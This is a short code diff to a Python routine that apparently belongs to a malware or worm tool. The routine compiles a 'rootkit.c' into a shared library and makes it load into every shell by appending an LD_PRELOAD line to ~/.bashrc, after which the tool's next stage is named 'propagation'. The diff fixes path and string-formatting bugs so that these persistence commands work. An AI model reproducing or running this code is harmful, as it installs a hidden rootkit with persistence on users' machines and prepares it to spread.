@@ -23,12 +23,13 @@ def run():
 
     file_path = Path(__file__).resolve()
     dir_path = file_path.parent
+    print(dir_path)
 
-    subprocess.run("gcc -fPIC -shared -o ../utils/rootkit.so ../utils/rootkit.c -ldl", shell=True)
+    subprocess.run("gcc -fPIC -shared -o ./utils/rootkit.so ./utils/rootkit.c -ldl", shell=True)
     print("1")
-    subprocess.run("sudo chmod 755 {dir_path}/../utils/rootkit.so", shell=True)
+    subprocess.run(f'chmod 755 {dir_path}/../utils/rootkit.so', shell=True)
     print("2")
-    subprocess.run("echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so' >> ~/.bashrc && . ~/.bashrc", shell=True)
+    subprocess.run(f"echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so' >> ~/.bashrc && . ~/.bashrc", shell=True)
     print("3")
 
     next_action = "propagation"
